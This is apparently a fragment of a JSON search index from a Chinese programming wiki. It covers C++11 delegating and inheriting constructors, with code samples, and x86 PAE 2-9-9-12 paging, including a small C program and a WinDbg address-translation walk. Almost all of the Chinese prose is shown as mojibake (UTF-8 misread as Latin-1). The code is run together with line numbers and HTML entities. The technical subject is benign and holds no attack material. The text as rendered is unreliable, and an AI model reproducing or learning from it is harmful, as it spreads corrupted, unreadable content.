å‡½æ•°ï¼Œè€Œæ— å‚æ„é€ å‡½æ•°åªåˆå§‹åŒ–äº†m_xæˆå‘˜ï¼Œm_yå’Œm_zæˆå‘˜æ²¡è¢«åˆå§‹åŒ–ã€‚ä¸è¿‡è¯´å›æ¥è¿™ä¸å±äºå§”æ‰˜æ„é€ å¸¦æ¥çš„é—®é¢˜ï¼Œè€Œæ˜¯å†™æ„é€ å‡½æ•°æ—¶æ²¡è€ƒè™‘å‘¨å…¨çš„é—®é¢˜ã€‚ å¯ä»¥å’Œå­ç±»çš„æ„é€ å‡½æ•°ä¸­è¦åœ¨initialization listä¸­è°ƒç”¨å®Œæˆå¯¹è±¡çˆ¶ç±»éƒ¨åˆ†çš„åˆå§‹åŒ–è¿›è¡Œç±»æ¯”å­¦ä¹ ï¼Œåªä¸è¿‡æœ‰ä¸åŒç‚¹ï¼š å­ç±»æ„é€ å‡½æ•°åœ¨initialization listä¸­è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œè¿˜å¯ä»¥åœ¨åˆå§‹åŒ–åˆ—è¡¨å¯¹å…¶ä»–æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼›è€Œå§”æ‰˜æ„é€ ä¸è¡Œ ä»æŠ½è±¡å±‚é¢çš„æ€æƒ³æ¥è¯´ï¼Œå­ç±»æ„é€ å‡½æ•°åœ¨initialization listä¸­è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°æ˜¯å› ä¸ºæ¯ä¸ªç±»çš„å¯¹è±¡éƒ½åº”è¯¥ç”±è¿™ä¸ªç±»æœ¬èº«å®Œæˆåˆå§‹åŒ–ï¼›è€Œå§”æ‰˜æ„é€ æ˜¯ä¸ºäº†ç®€åŒ–ä»£ç ï¼Œæé«˜å¯è¯»æ€§ï¼Œæé«˜ä»£ç å¯ç»´æŠ¤æ€§ å‚è€ƒé“¾æ¥ğŸ”—ï¼š C++ä¸­å§”æ‰˜æ„é€ å‡½æ•°çš„ç”¨æ³• C++11 å§”æ‰˜æ„é€ å‡½æ•° å…³äºä½¿ç”¨C++11ä¸­å§”æ‰˜æ„é€ å‡½æ•° å§”æ‰˜æ„é€  ç»§æ‰¿æ„é€ ï¼ˆInheritance constructorï¼‰ å‚è€ƒğŸ”—ï¼š C++11 ç»§æ‰¿æ„é€ å‡½æ•° c++11 ç»§æ‰¿æ„é€ å‡½æ•°å’Œå§”æ‰˜æ„é€ å‡½æ•° C++11ç»§æ‰¿æ„é€ å‡½æ•° ç»§æ‰¿çš„æ„é€ å‡½æ•° é—®é¢˜ï¼šåœ¨C++ä¸­ï¼Œæ¯ä¸ªç±»åªè´Ÿè´£å®ƒè‡ªå·±ç±»æˆå‘˜çš„åˆå§‹åŒ–ï¼Œå­ç±»ç»§æ‰¿äº†çˆ¶ç±»çš„æˆå‘˜ï¼Œä½†è¿™äº›æˆå‘˜çš„åˆå§‹åŒ–è¿˜æ˜¯è¦è®©çˆ¶ç±»åšã€‚å¦‚æœçˆ¶ç±»ä¸­å­˜åœ¨è¾ƒå¤šç‰ˆæœ¬çš„æ„é€ å‡½æ•°ï¼Œå­ç±»è¦ä¸ºæ¯ä¸€ä¸ªçˆ¶ç±»æ„é€ å‡½æ•°ç¼–å†™ä¸€ä¸ªå¯¹åº”çš„å­ç±»æ„é€ å‡½æ•°éº»çƒ¦å¾—å¾ˆã€‚ æ³¨ï¼šusingåœ¨å­ç±»çš„publicã€protectedã€privateå“ªé‡Œå†™éƒ½å¯ä»¥ï¼Œä¸å½±å“ç»§æ‰¿çš„å‡½æ•°çš„è®¿é—®é™åˆ¶ ä¼ ç»ŸC++å†™æ³•C++11çš„ç»§æ‰¿æ„é€ -ä¾‹1C++11çš„ç»§æ‰¿æ„é€ -ä¾‹212345678910111213141516171819//before C++11ï¼šclass Base&#123;public: char m_cvalue; int m_ivalue; Base(char c) : m_cvalue(c), m_ivalue(0) &#123;&#125; Base(int x) : m_cvalue(&#x27;A&#x27;), m_ivalue(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: Derived(char c) : Base(c) &#123;&#125; Derived(int x) : Base(x) &#123;&#125;&#125;; 1234567891011121314151617181920212223242526//since C++11ï¼šclass Base&#123;public: char m_cvalue; int m_ivalue; Base(char c) : m_cvalue(c), m_ivalue(0) &#123;&#125; Base(int x) : m_cvalue(&#x27;A&#x27;), m_ivalue(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: using Base::Base;&#125;;int main() &#123; Derived d1(&#x27;B&#x27;); // ä½¿ç”¨charç±»å‹çš„æ„é€ å‡½æ•°åˆ›å»ºDerivedç±»å¯¹è±¡ Derived d2(10); // ä½¿ç”¨intç±»å‹çš„æ„é€ å‡½æ•°åˆ›å»ºDerivedç±»å¯¹è±¡ return 0;&#125; 12345678910111213141516class Base&#123;public: char m_cvalue; int m_ivalue; Base(char c) : m_cvalue(c), m_ivalue(0) &#123;&#125; Base(int x) : m_cvalue(&#x27;A&#x27;), m_ivalue(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: using Base::Base;&#125;; C++ 11æ ‡å‡†æ›´å·§å¦™çš„æ˜¯ï¼Œç»§æ‰¿æ„é€ å‡½æ•°ä¸ç±»çš„ä¸€äº›é»˜è®¤å‡½æ•°ï¼ˆé»˜è®¤æ„é€ ã€ææ„ã€æ‹·è´æ„é€ å‡½æ•°ç­‰ï¼‰ä¸€æ ·ï¼Œéƒ½æ˜¯éšå¼å£°æ˜ã€‚å¦‚æœä¸€ä¸ªç»§æ‰¿æ„é€ å‡½æ•°æ²¡è¢«ä½¿ç”¨ï¼Œç¼–è¯‘å™¨ä¸ä¼šä¸ºå…¶äº§ç”ŸçœŸæ­£çš„å‡½æ•°ä»£ç ï¼Œè¿™æ ·ä¼šèŠ‚çœä»£ç ç©ºé—´ï¼ˆä¸Šé¢çš„ä¾‹1å’Œä¾‹2ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè‡ªå·±å†™ï¼Œéº»çƒ¦ï¼Œè¿˜ä¸€å®šå ä»£ç ç©ºé—´ï¼Œè¿™ä¸ªäº‹è¿˜ä¸å¦‚è®©ç¼–è¯‘å™¨åšã€‚ åœ¨å­ç±»ä¸­ç”¨äº†usingç»§æ‰¿äº†çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œç›¸å½“äºç¼–è¯‘å™¨å¸®æˆ‘ä»¬å†™äº†é‚£äº›åˆå§‹åŒ–åˆ—è¡¨çš„æ„é€ å‡½æ•°ï¼Œè¿™æ—¶ç¼–è¯‘å™¨å°±ä¸ä¼šç”Ÿæˆdefaultæ„é€ å‡½æ•°äº†ã€‚ 1234567891011121314151617181920class Base&#123;public: int m_x; Base(int x) :m_x(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: using Base::Base;&#125;;int main()&#123; Derived d(1); return 0;&#125; å­ç±»ç»§æ‰¿çˆ¶ç±»æ„é€ å‡½æ•°æ˜¯ä¸ºäº†å·æ‡’ä¸ç”¨åœ¨å­ç±»ä¸€ä¸€æŠŠå‚æ•°ä¼ ç»™çˆ¶ç±»æ„é€ ï¼Œé‚£å¦‚æœå­ç±»æœ‰æˆå‘˜éœ€è¦åˆå§‹åŒ–å‘¢ï¼Ÿè¿˜æ˜¯è¦è‡ªå·±å†™å­ç±»çš„æ„é€ å‡½æ•°ï¼Œæˆ–ï¼Œç”¨NSDMIï¼ˆå°±åœ°åˆå§‹åŒ–ï¼‰ 12345678910111213141516171819202122232425262728class Base &#123;public: int m_x; Base(int x) : m_x(x) &#123;&#125;&#125;;class Derived : public Base &#123;public: // ä½¿ç”¨ç»§æ‰¿æ„é€ å‡½æ•° using Base::Base; // æ–°å¢æ´¾ç”Ÿç±»æ„é€ å‡½æ•° Derived(int a, double b) : Base(a), m_double(b) &#123;&#125; double m_double = 0.0;&#125;;int main() &#123; Derived d1(10); // ä½¿ç”¨ç»§æ‰¿çš„æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡ Derived d2(20, 5.5); // ä½¿ç”¨æ´¾ç”Ÿç±»è‡ªå®šä¹‰çš„æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡ return 0;&#125;"},{"title":"å°ç»“","path":"/wiki/Modern_C++/å°ç»“_Modern_C++.html","content":"å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ C0xï¼ˆC11ï¼‰æ–°ç‰¹æ€§ç‚¹è¯„ å¯¹C++ 11æ–°ç‰¹æ€§çš„ç‚¹è¯„"},{"title":"2-9-9-12åˆ†é¡µ","path":"/wiki/Protected_Mode/2-9-9-12åˆ†é¡µ.html","content":"å†…å®¹å›é¡¾ åœ¨10-10-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼Œç‰©ç†åœ°å€æœ€å¤šå¯è¾¾4GBã€‚ä½†éšç€ç¡¬ä»¶å‘å±•ï¼Œ4GBçš„ç‰©ç†åœ°å€èŒƒå›´å·²æ— æ³•æ»¡è¶³è¦æ±‚ï¼ŒIntelåœ¨1996å¹´å°±å·²ç»æ„è¯†åˆ°è¿™ä¸ªé—®é¢˜äº†ï¼Œæ‰€ä»¥è®¾è®¡äº†æ–°çš„åˆ†é¡µæ–¹å¼ï¼Œä¹Ÿå°±æ˜¯2-9-9-12åˆ†é¡µ,åˆç§°ä¸ºPAEï¼ˆç‰©ç†åœ°å€æ‰©å±•ï¼‰åˆ†é¡µï¼ŒPhysical Address Extensionã€‚ åˆ†é¡µæ–¹å¼è®¾è®¡ç¼˜ç”± 10-10-12åˆ†é¡µ ä¸€å¼€å§‹æ˜¯ç¡®å®šé¡µçš„å¤§å°ã€‚intelå·¥ç¨‹å¸ˆè®¤ä¸º1ä¸ªé¡µçš„å¤§å°ä¸º4kbæ˜¯åˆç†çš„ï¼ˆå°±åƒARMå·¥ç¨‹å¸ˆè®¤ä¸º1ä¸ªé¡µçš„å¤§å°ä¸º2kbæ˜¯åˆç†çš„ï¼‰ï¼Œ4096ä¸ªå­—èŠ‚ã€‚ ä¸ºäº†æ‰¾åˆ°æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œéœ€è¦å¤šå°‘ä¸ªäºŒè¿›åˆ¶ä½ï¼Ÿ4096ä¸ªç´¢å¼•ï¼Œè‡³å°‘12ä½ï¼Œ2çš„12æ¬¡æ–¹ã€‚äºæ˜¯ç¡®å®šäº†12ã€‚ å½“åˆçš„ç‰©ç†å†…å­˜æ¯”è¾ƒå°ï¼Œintelå·¥ç¨‹å¸ˆè®¤ä¸ºPTEå¤§å°ä¸º4ä¸ªå­—èŠ‚å°±å¤Ÿäº†ã€‚å› ä¸º1ä¸ªé¡µçš„å¤§å°æ˜¯4kbï¼Œ1ä¸ªæˆå‘˜PTEçš„å¤§å°æ˜¯4å­—èŠ‚ï¼Œæ‰€ä»¥1ä¸ªPTTè¡¨æœ‰4kb/4å­—èŠ‚=1024ä¸ªPTEã€‚ ä¸ºäº†æ‰¾åˆ°æ¯ä¸€ä¸ªPTEï¼Œéœ€è¦å¤šå°‘ä¸ªäºŒè¿›åˆ¶ä½ï¼Ÿ1024ä¸ªç´¢å¼•ï¼Œè‡³å°‘10ä½ï¼Œ2çš„10æ¬¡æ–¹ã€‚äºæ˜¯ç¡®å®šäº†10ã€‚ ä¸PTEåŒç†ã€‚1ä¸ªé¡µçš„å¤§å°æ˜¯4kbï¼Œ1ä¸ªæˆå‘˜PDEçš„å¤§å°æ˜¯4å­—èŠ‚ï¼Œæ‰€ä»¥1ä¸ªPDTè¡¨æœ‰4kb/4å­—èŠ‚=1024ä¸ªPDEã€‚ ä¸ºäº†æ‰¾åˆ°æ¯ä¸€ä¸ªPDEï¼Œéœ€è¦å¤šå°‘ä¸ªäºŒè¿›åˆ¶ä½ï¼Ÿ1024ä¸ªç´¢å¼•ï¼Œè‡³å°‘10ä½ï¼Œ2çš„10æ¬¡æ–¹ã€‚äºæ˜¯ç¡®å®šäº†10ã€‚ è€Œä¸”çº¿æ€§åœ°å€æ˜¯32ä½ï¼Œç¡®å®šäº†12ï¼Œç¡®å®šäº†ç¬¬äºŒä¸ª10ï¼Œåˆšå¥½å‰©ä¸‹10ä½ã€‚ 2-9-9-12åˆ†é¡µ 1ä¸ªé¡µçš„å¤§å°ä»æ˜¯4kbï¼Œæ‰€ä»¥12æ²¡å˜ã€‚ ä¸ºäº†æ‰¾åˆ°æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œéœ€è¦å¤šå°‘ä¸ªäºŒè¿›åˆ¶ä½ï¼Ÿ4096ä¸ªç´¢å¼•ï¼Œè‡³å°‘12ä½ï¼Œ2çš„12æ¬¡æ–¹ã€‚äºæ˜¯ç¡®å®šäº†12ã€‚ ç‰©ç†å†…å­˜å¯»å€èŒƒå›´ç”±ä»€ä¹ˆå†³å®šï¼Ÿå‰é¢æœ‰é“é¢˜ï¼Œ10-10-12åˆ†é¡µæ¨¡å¼ä¸‹èƒ½è¯†åˆ«çš„ç‰©ç†å†…å­˜èŒƒå›´æ˜¯å¤šå°‘?å½“æ—¶æ˜¯è¿™æ ·ç®—çš„ï¼š1024é¡¹PDEÃ—1024é¡¹PTEÃ—4kb = 4GBã€‚åŸæ¥æ˜¯ï¼š1å¼ PTTè¡¨ï¼Œé‚£æˆ‘è‡ªå·±åŠ ä¸€å¼ PTTè¡¨ï¼Œèƒ½ä¸èƒ½è®©è¯†åˆ«èŒƒå›´å˜æˆ8Gï¼Ÿè¿™ä¹ˆçœ‹ï¼šåœ¨10-10-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼Œæœ‰çº¿æ€§åœ°å€0x12345678å‡è®¾æŸ¥åˆ°çš„PDEï¼ŒPTEï¼Œç‰©ç†åœ°å€åˆ†åˆ«å¦‚ä¸‹ï¼šPDEï¼šFFAFF123ï¼ˆ32ä½ï¼‰PTEï¼šFFBFF123ï¼ˆ32ä½ï¼‰ç‰©ç†åœ°å€ï¼šFFBFF678ï¼ˆ32ä½ï¼‰ï¼Œ32ä½ï¼Œæ‰€ä»¥ç‰©ç†åœ°å€è¯†åˆ«èŒƒå›´ï¼š2^32=4GBPTEçš„é«˜20ä½æŒ‡ç¤ºäº†ç‰©ç†é¡µåŸºå€ï¼Œçº¿æ€§åœ°å€ä½12ä½æŒ‡ç¤ºäº†ç‰©ç†é¡µå†…åç§»ã€‚å¦‚æœä¸å°†ç‰©ç†åœ°å€çš„ä½æ•°æ‹“å®½ï¼Œé‚£ä¹ˆç‰©ç†åœ°å€è¯†åˆ«èŒƒå›´ä»ç„¶æ˜¯4GBã€‚è·Ÿå‰é¢æœ‰å¤šå°‘å¼ PDTï¼ŒPTTè¡¨æ— å…³ã€‚ç‰©ç†åœ°å€è¯†åˆ«èŒƒå›´ç”±ç‰©ç†åœ°å€é•¿åº¦å†³å®šï¼Œè€Œå†³å®šç‰©ç†åœ°å€é•¿åº¦çš„æ˜¯PTEè¡¨é¡¹åœ°å€éƒ¨åˆ†çš„é•¿åº¦ï¼ˆåœ°å€+å±æ€§ï¼‰ã€‚å®é™…ä¸Šï¼Œå†³å®šç‰©ç†å†…å­˜å¯»å€èŒƒå›´çš„å”¯ä¸€å› ç´ æ˜¯é¡µè¡¨é¡¹PTEã€‚32ä½çš„PTEï¼Œä½12ä½æ˜¯å±æ€§ï¼Œé«˜20ä½æ˜¯åŸºå€ï¼Œä½12ä½è¡¥é›¶åæ„æˆäº†ç‰©ç†é¡µåŸºå€ã€‚æ‰€ä»¥ï¼Œç‰©ç†åœ°å€çš„å¯»å€èŒƒå›´æ˜¯ç”±PTEæ„æˆçš„è¿™32ä½ç‰©ç†é¡µåŸºå€å†³å®šçš„ï¼Œ4GBæ˜¯ä»è¿™é‡Œæ¥çš„ã€‚æ³¨æ„ï¼Œçº¿ç¨‹çš„4GBå’Œç‰©ç†åœ°å€å¯»å€èŒƒå›´çš„4GBä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿ã€‚ç‰©ç†åœ°å€å¯»å€çš„4GBåˆšæ‰å·²è§£é‡Šè¿‡ï¼Œæ˜¯ç”±PTEå†³å®šçš„ã€‚çº¿ç¨‹çš„4GBæŒ‡çš„æ˜¯32ä½çº¿æ€§åœ°å€ç¡®å®šçš„ï¼Œè¿™ä¸ªæ‰æ˜¯å’Œç³»ç»Ÿä½æ•°ç›¸å…³çš„ï¼Œå’Œåˆ†é¡µæ¨¡å¼æ— å…³ï¼Œ32ä½ç³»ç»Ÿçš„çº¿æ€§åœ°å€å°±æ˜¯32ä½ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦å¢åŠ ç‰©ç†åœ°å€çš„è®¿é—®èŒƒå›´ï¼Œå°±è¦å¢åŠ PTEçš„ä½æ•°ã€‚å¦‚æœPTEæ˜¯32ä½ï¼Œèƒ½ç´¢å¼•çš„ç‰©ç†åœ°å€æ˜¯4Gï¼›å¦‚æœPTEæ˜¯33ä½ï¼Œèƒ½ç´¢å¼•çš„ç‰©ç†åœ°å€æ˜¯8Gï¼›å¦‚æœPTEæ˜¯34ä½ï¼Œèƒ½ç´¢å¼•çš„ç‰©ç†åœ°å€æ˜¯16Gï¼›å¦‚æœPTEæ˜¯35ä½ï¼Œèƒ½ç´¢å¼•çš„ç‰©ç†åœ°å€æ˜¯32Gã€‚å› ä¸ºåœ¨10-10-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼ŒPTEå¤§å°æ˜¯4å­—èŠ‚ï¼Œè€ƒè™‘å¯¹é½çš„å› ç´ ï¼Œæ‰€ä»¥å°†PTEå¢åŠ ä¸€å€ï¼Œå³8ä¸ªå­—èŠ‚ã€‚æ‹“å±•ï¼š32ä½æ“ä½œç³»ç»Ÿèƒ½è¯†åˆ«è¶…è¿‡4GBçš„å†…å­˜å—ï¼Ÿ32ä½windows server2003å’Œ2008æ˜¯32ä½xpçš„æœåŠ¡å™¨ç‰ˆæœ¬ï¼Œå®ƒä»¬å¯ä»¥çªç ´4GBã€‚è¿™æ˜¯å› ä¸ºæ“ä½œç³»ç»Ÿå†…æ ¸æºç çš„é™åˆ¶ã€‚æˆ‘ä»¬ä¹‹å‰åœ¨10-10-12åˆ†é¡µä¸‹è®¡ç®—èƒ½è¯†åˆ«çš„æœ€å¤§ç‰©ç†å†…å­˜æ˜¯4GBï¼Œä½†xpç³»ç»Ÿé»˜è®¤å°±æ˜¯2-9-9-12åˆ†é¡µï¼Œ2-9-9-12åˆ†é¡µèƒ½è¯†åˆ«64GBå†…å­˜ï¼Œä½†è¿˜æ˜¯ä¸èƒ½çªç ´4GBã€‚æ‰€ä»¥ä¸æ˜¯åˆ†é¡µæ¨¡å¼çš„åŸå› ï¼Œè€Œæ˜¯æ“ä½œç³»ç»Ÿåšçš„é™åˆ¶ã€‚ç½‘ä¸Šæœ‰xpçªç ´4GBçš„è¡¥ä¸ï¼Œå°±æ˜¯hookäº†æ“ä½œç³»ç»Ÿä¸¤ä¸ªå¯¹å†…å­˜4GBçš„æ£€æµ‹ã€‚ å› ä¸º1ä¸ªé¡µçš„å¤§å°æ˜¯4kbï¼Œ1ä¸ªæˆå‘˜PTEçš„å¤§å°æ˜¯8å­—èŠ‚ï¼Œæ‰€ä»¥1ä¸ªPTTè¡¨æœ‰4kb/8å­—èŠ‚=512é¡¹PTEã€‚ ä¸ºäº†æ‰¾åˆ°æ¯ä¸€é¡¹PTEï¼Œéœ€è¦å¤šå°‘ä¸ªäºŒè¿›åˆ¶ä½ï¼Ÿ512ä¸ªç´¢å¼•ï¼Œè‡³å°‘9ä½ï¼Œ2çš„9æ¬¡æ–¹ã€‚äºæ˜¯ç¡®å®šäº†9ã€‚ ä¸PTEåŒç†ã€‚1ä¸ªé¡µçš„å¤§å°æ˜¯4kbï¼Œ1ä¸ªæˆå‘˜PDEçš„å¤§å°æ˜¯8å­—èŠ‚ï¼Œæ‰€ä»¥1ä¸ªPDTè¡¨æœ‰4kb/8å­—èŠ‚=512ä¸ªPDEã€‚ ä¸ºäº†æ‰¾åˆ°æ¯ä¸€ä¸ªPDEï¼Œéœ€è¦å¤šå°‘ä¸ªäºŒè¿›åˆ¶ä½ï¼Ÿ512ä¸ªç´¢å¼•ï¼Œè‡³å°‘9ä½ï¼Œ2çš„9æ¬¡æ–¹ã€‚äºæ˜¯ç¡®å®šäº†9ã€‚ ä¸ºäº†çªç ´4GBçš„é™åˆ¶ï¼ŒPTEå¿…é¡»å¢é•¿ï¼ŒåŠ ä¸Šè€ƒè™‘å¯¹é½ï¼ŒPTEå˜æˆäº†8å­—èŠ‚ã€‚é‚£PDEä»ç„¶ç”¨åŸæ¥çš„4å­—èŠ‚å¯ä»¥å—ï¼Ÿå› ä¸ºPTEæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªç‰©ç†é¡µã€‚4å­—èŠ‚çš„PDEèƒ½æ‰¾çš„ç‰©ç†åœ°å€èŒƒå›´æ˜¯0-FFFFFFFFï¼Œ0-4GBï¼Œæ‹“å®½åçš„8å­—èŠ‚PTEå¦‚æœåœ¨4GBä»¥ä¸Šçš„åœ°å€ï¼ŒPDEå°±æ‰¾ä¸åˆ°äº†ã€‚æ‹“å®½PDEä½æ•°çš„åŸå› æ˜¯ä¸ºäº†æ‰¾åˆ°PTEã€‚ çº¿æ€§åœ°å€ä¸€å…±32ä½ï¼Œå·²ç”¨äº†9-9-12ï¼Œè¿˜å‰©2ä½ã€‚windowsè¿›è¡Œäº†æ‰©å±•ã€‚æ‰©å±•æˆäº†é¡µç›®å½•æŒ‡é’ˆè¡¨ï¼ŒPDPTï¼ˆPage-Directory-Point-Tableï¼‰ã€‚é‡Œé¢çš„æˆå‘˜å«é¡µç›®å½•æŒ‡é’ˆè¡¨é¡¹ï¼ŒPDPTEï¼ˆPag e-Directory-Point-Table Entryï¼‰ã€‚æ¯é¡¹æˆå‘˜8å­—èŠ‚ï¼Œæˆå‘˜æ•°é‡ä¸º4ï¼ˆ2ä¸ªäºŒè¿›åˆ¶ä½ï¼‰ã€‚ä»åå­—å°±å¯ä»¥çœ‹å‡ºï¼Œè¿™é¡¹æˆå‘˜æ˜¯æŒ‡é’ˆï¼ŒæŒ‡å‘çš„æ˜¯é¡µç›®å½•è¡¨ã€‚æ¯ä¸ªPDPTEéƒ½æŒ‡å‘äº†ä¸€ä¸ªPDTè¡¨ã€‚ å‰©ä¸‹çš„2ä½ä¸ç”¨è¡Œå—ï¼Ÿæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰4GBçš„è™šæ‹Ÿå†…å­˜ï¼Œå‡è®¾æç«¯æƒ…å†µä¸‹ï¼Œæˆ‘éœ€è¦å°†4GBçš„çº¿æ€§åœ°å€éƒ½æŒ‚ä¸Šäº†ç‰©ç†é¡µã€‚å¦‚æœæ²¡æœ‰PDPTè¡¨ï¼Œè™šæ‹Ÿå†…å­˜ç©ºé—´åªæœ‰512Ã—512Ã—4kb=1GBã€‚çº¿æ€§åœ°å€æœ‰32ä½ï¼Œå´åªèƒ½ç»™1GBçš„è™šæ‹Ÿæœºå†…å­˜æŒ‚ç‰©ç†é¡µã€‚è¿™æ ·è®¾è®¡å°±é”™äº†ã€‚PDPTEï¼Œ4ä¸ªæŒ‡é’ˆï¼Œ1ä¸ªæŒ‡é’ˆ1ä¸ªPDTï¼Œ1ä¸ªæŒ‡é’ˆ1ä¸ªGã€‚å¦‚æœä½ æƒ³æŒ‚æ»¡ï¼Œè¿™æ ·çš„è®¾è®¡æ˜¯å¯ä»¥æŒ‚æ»¡çš„ã€‚å¦‚æœä¸ç”¨ï¼Œé‚£ä¹ˆçº¿æ€§åœ°å€å°±åªæœ‰30ä½ï¼Œé‚£ä¹ˆä¸€ä¸ªè¿›ç¨‹æœ€å¤šå°±åªèƒ½æ˜ å°„1GBçš„å†…å­˜äº†ã€‚ åœ¨2-9-9-12åˆ†é¡µä¸‹ï¼Œç†è®ºä¸Š8å­—èŠ‚å…¨ç”¨çš„è¯ï¼Œèƒ½è¯†åˆ«2^64çš„ç‰©ç†åœ°å€ã€‚ä½†æ“ä½œç³»ç»Ÿåšäº†é™åˆ¶ï¼Œï¼ˆçŒœæµ‹å› ä¸ºç¡¬ä»¶ä¸å¥½å®ç°ï¼‰ï¼Œ æ‰€ä»¥èƒ½è¯†åˆ«çš„ç‰©ç†åœ°å€èŒƒå›´æ˜¯2^36=64GBã€‚ ä¸ºäº†æ‹“å®½ç‰©ç†åœ°å€èŒƒå›´ï¼Œæ‰€ä»¥PTEå˜æˆäº†8å­—èŠ‚ï¼› ä¸ºäº†æ‰¾PTEï¼ŒPDEä¹Ÿå˜æˆäº†8å­—èŠ‚ï¼› ä¸ºäº†æ‰¾PDEï¼ŒPDPTEä¹Ÿå˜æˆäº†8å­—èŠ‚ã€‚ CR3ä»æ˜¯32ä½ï¼Œè¿™è¯´æ˜ï¼ŒPDPTEä¸€å®šåœ¨ç‰©ç†åœ°å€4GBä»¥å†…ã€‚ 2-9-9-12åˆ†é¡µç»“æ„å›¾ 2ï¼šPDPIï¼Œåœ¨PDPTè¡¨ä¸­çš„ç´¢å¼•ã€‚ 9ï¼šPDIï¼Œåœ¨PDTè¡¨ä¸­çš„ç´¢å¼•ã€‚ 9ï¼šPTIï¼Œåœ¨PTTè¡¨ä¸­çš„ç´¢å¼•ã€‚ 12ï¼šåœ¨ç‰©ç†é¡µä¸­çš„åç§»ã€‚ 2-9-9-12åˆ†é¡µå’Œ10-10-12åˆ†é¡µ çº¿æ€§åœ°å€32ä½ï¼Œæ‰€ä»¥è¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´éƒ½æ˜¯4GBã€‚ 2-9-9-12åˆ†é¡µå’Œ10-10-12åˆ†é¡µçš„åŒºåˆ«æ˜¯ï¼šæ‹“å®½äº†èƒ½è¯†åˆ«çš„ç‰©ç†å†…å­˜èŒƒå›´ã€‚ èƒ½è¯†åˆ«çš„ç‰©ç†å†…å­˜èŒƒå›´å’Œå®é™…ç‰©ç†å†…å­˜ï¼ˆæ’äº†å¤šå°‘å†…å­˜æ¡ï¼‰ï¼Œä¸åŒï¼Œä¹‹é—´è¿˜æœ‰ä¸€å±‚MMUçš„è½¬æ¢ã€‚ ä¸¾ä¸ªä¾‹å­ç†è§£ï¼š å‡è®¾å†…å­˜æ¡æ— é™å¤§ã€‚ å‡è®¾åœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åå°±å°†å®ƒ4GBçš„è™šæ‹Ÿç©ºé—´éƒ½æŒ‚ä¸Šç‰©ç†é¡µï¼ŒæŒ‚æ»¡ï¼Œè€Œä¸”ä¸è€ƒè™‘æ¢é¡µã€‚ åœ¨10-10-12åˆ†é¡µä¸‹ï¼Œå°±åªèƒ½å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ã€‚å› ä¸ºèƒ½è¯†åˆ«çš„ç‰©ç†åœ°å€èŒƒå›´æ˜¯4GBã€‚ è€Œåœ¨2-9-9-12åˆ†é¡µä¸‹ï¼Œå¯ä»¥å¯åŠ¨64/4=16ä¸ªè¿›ç¨‹ã€‚å› ä¸ºåœ¨2-9-9-12ä¸‹èƒ½è¯†åˆ«çš„ç‰©ç†åœ°å€æœ€å¤§æ˜¯64GBã€‚ ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„4GBç”¨è¿™ä¸ªç‰©ç†é¡µï¼š0-FFFFFFFF ç¬¬äºŒä¸ªè¿›ç¨‹çš„4GBç”¨è¿™ä¸ªç‰©ç†é¡µï¼š100000000-1FFFFFFFF ç¬¬ä¸‰ä¸ªè¿›ç¨‹çš„4GBç”¨â€¦ â€¦ â€¦ ç¬¬åå…­ä¸ªè¿›ç¨‹çš„4GBç”¨â€¦ å®éªŒï¼šé€šè¿‡çº¿æ€§åœ°å€æ‰¾åˆ°ç‰©ç†åœ°å€ ç¡®ä¿ç³»ç»Ÿå¼€å¯çš„åˆ†é¡µæ¨¡å¼æ˜¯PAEæ¨¡å¼ 1234567891011#include &lt;stdio.h&gt;int main()&#123;\tchar x=&#x27;a&#x27;;\tprintf(&quot;xçš„åœ°å€:%x &quot;,&amp;x); getchar();\treturn 0;&#125; è¿è¡Œï¼Œæ‰“å°å˜é‡xçš„çº¿æ€§åœ°å€ï¼Œç„¶åæ‰¾åˆ°å®ƒçš„ç‰©ç†åœ°å€ å®éªŒè¿‡ç¨‹è¿è¡Œï¼Œgetcharæ—¶windbgä¸‹æ–­12345çº¿æ€§åœ°å€12ff7cæ‹†åˆ†00 //2 PDPI=0000000000 //9 PDI=0100101111 //9 PTI=12ff7c //12 ç‰©ç†é¡µåç§»=f7cPDPIã€PDIã€PTIéƒ½è¦Ã—8å±æ€§è¿˜æ˜¯12ä½ï¼Œæ‰€ä»¥å3ä½ï¼ˆåå…­è¿›åˆ¶ï¼‰è¦æ¸…0å¯ä»¥çœ‹åˆ°è¿›ç¨‹çš„cr3æ˜¯0x20è¿™æ ·å¢é•¿ã€‚10-10-12çš„cr3æ˜¯0x1000å¢é•¿!vtopæŒ‡ä»¤éªŒè¯ï¼š1!vtop 0d540320 12ff7c PDPTEç»“æ„ PDPTEå…±æœ‰å››é¡¹(2-9-9-12ä¸­çš„ç¬¬ä¸€ä¸ª2)ã€‚ 63-36ä½Reserverdä¿ç•™ä½ï¼Œä¿ç•™ä¸æ˜¯æ„å‘³ç€å¡«0ã€‚ä¿ç•™çš„æ„æ€æ˜¯CPUè¦ç”¨ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨ï¼Œè€Œä¸”CPUç”¨äº†ä¹Ÿä¸ä¼šå‘Šè¯‰æˆ‘ä»¬å®ƒæ€ä¹ˆç”¨ã€‚ 